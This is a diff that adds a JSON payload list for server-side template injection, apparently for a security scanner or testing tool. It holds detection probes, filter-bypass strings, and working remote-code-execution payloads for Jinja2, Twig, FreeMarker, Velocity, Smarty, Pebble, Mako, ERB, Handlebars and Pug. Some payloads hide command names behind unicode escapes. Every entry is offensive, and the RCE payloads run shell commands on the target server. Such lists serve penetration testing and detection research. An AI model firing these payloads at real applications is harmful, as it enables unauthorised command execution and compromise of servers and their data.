@@ -1,0 +1,217 @@
+[
+  {
+    "name": "Detection Probe",
+    "category": "SSTI",
+    "description": "Mathematical expression for detection",
+    "payload": "{{7*7}}",
+    "tags": [
+      "detection",
+      "jinja2",
+      "twig"
+    ]
+  },
+  {
+    "name": "Detection Probe 2",
+    "category": "SSTI",
+    "description": "Alternative math probe",
+    "payload": "${7*7}",
+    "tags": [
+      "detection",
+      "freemarker",
+      "el"
+    ]
+  },
+  {
+    "name": "Jinja2 Config",
+    "category": "SSTI",
+    "description": "Jinja2 config object access",
+    "payload": "{{config}}",
+    "tags": [
+      "jinja2",
+      "info-gather"
+    ]
+  },
+  {
+    "name": "Jinja2 RCE",
+    "category": "SSTI",
+    "description": "Jinja2 remote code execution",
+    "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+    "tags": [
+      "jinja2",
+      "rce"
+    ]
+  },
+  {
+    "name": "Jinja2 RCE v2",
+    "category": "SSTI",
+    "description": "Jinja2 RCE via MRO chain",
+    "payload": "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}",
+    "tags": [
+      "jinja2",
+      "rce",
+      "advanced"
+    ]
+  },
+  {
+    "name": "Jinja2 Cycler",
+    "category": "SSTI",
+    "description": "Jinja2 RCE via cycler",
+    "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+    "tags": [
+      "jinja2",
+      "rce"
+    ]
+  },
+  {
+    "name": "Jinja2 Joiner",
+    "category": "SSTI",
+    "description": "Jinja2 RCE via joiner",
+    "payload": "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+    "tags": [
+      "jinja2",
+      "rce"
+    ]
+  },
+  {
+    "name": "Twig Detection",
+    "category": "SSTI",
+    "description": "Twig template engine detection",
+    "payload": "{{7*'7'}}",
+    "tags": [
+      "twig",
+      "detection"
+    ]
+  },
+  {
+    "name": "Twig RCE",
+    "category": "SSTI",
+    "description": "Twig SSTI to RCE",
+    "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+    "tags": [
+      "twig",
+      "rce",
+      "php"
+    ]
+  },
+  {
+    "name": "FreeMarker RCE",
+    "category": "SSTI",
+    "description": "FreeMarker template injection RCE",
+    "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+    "tags": [
+      "freemarker",
+      "rce",
+      "java"
+    ]
+  },
+  {
+    "name": "Velocity RCE",
+    "category": "SSTI",
+    "description": "Apache Velocity template injection RCE",
+    "payload": "#set($e='')#set($e=$e.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))$e.waitFor()",
+    "tags": [
+      "velocity",
+      "rce",
+      "java"
+    ]
+  },
+  {
+    "name": "Smarty Detection",
+    "category": "SSTI",
+    "description": "Smarty PHP template detection",
+    "payload": "{$smarty.version}",
+    "tags": [
+      "smarty",
+      "detection",
+      "php"
+    ]
+  },
+  {
+    "name": "Smarty RCE",
+    "category": "SSTI",
+    "description": "Smarty SSTI to RCE",
+    "payload": "{\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028'id')}",
+    "tags": [
+      "smarty",
+      "rce",
+      "php"
+    ]
+  },
+  {
+    "name": "Pebble RCE",
+    "category": "SSTI",
+    "description": "Pebble Java template injection",
+    "payload": "{{request.class.forName('java.lang.Runtime').getMethod('exec',request.class.forName('java.lang.String')).invoke(request.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}}",
+    "tags": [
+      "pebble",
+      "rce",
+      "java"
+    ]
+  },
+  {
+    "name": "Mako RCE",
+    "category": "SSTI",
+    "description": "Mako Python template injection",
+    "payload": "${__import__('os').popen('id').read()}",
+    "tags": [
+      "mako",
+      "rce",
+      "python"
+    ]
+  },
+  {
+    "name": "ERB Ruby",
+    "category": "SSTI",
+    "description": "ERB Ruby template injection",
+    "payload": "<%= \\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0028'id') %>",
+    "tags": [
+      "erb",
+      "rce",
+      "ruby"
+    ]
+  },
+  {
+    "name": "Handlebars RCE",
+    "category": "SSTI",
+    "description": "Handlebars.js SSTI to RCE",
+    "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073').\\u0065\\u0078\\u0065\\u0063\\u0053\\u0079\\u006e\\u0063('id').toString();\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+    "tags": [
+      "handlebars",
+      "rce",
+      "nodejs"
+    ]
+  },
+  {
+    "name": "Pug RCE",
+    "category": "SSTI",
+    "description": "Pug (Jade) SSTI to RCE",
+    "payload": "-var x = root.process\n-x = x.mainModule.require\n-x = x('\\u0063\\u0068\\u0069\\u006c\\u0064\\u005f\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073')\n= x.\\u0065\\u0078\\u0065\\u0063\\u0053\\u0079\\u006e\\u0063('id')",
+    "tags": [
+      "pug",
+      "rce",
+      "nodejs"
+    ]
+  },
+  {
+    "name": "SSTI Filter Bypass Underscore",
+    "category": "SSTI",
+    "description": "SSTI bypass with underscore trick",
+    "payload": "{{request|attr('__class__')|attr('__mro__')|list}}",
+    "tags": [
+      "jinja2",
+      "bypass",
+      "filter"
+    ]
+  },
+  {
+    "name": "SSTI Dot Notation Bypass",
+    "category": "SSTI",
+    "description": "Bypass dot notation restrictions",
+    "payload": "{{request['__class__']['__mro__'][1]['__subclasses__']()}}",
+    "tags": [
+      "jinja2",
+      "bypass",
+      "bracket"
+    ]
+  }
+]
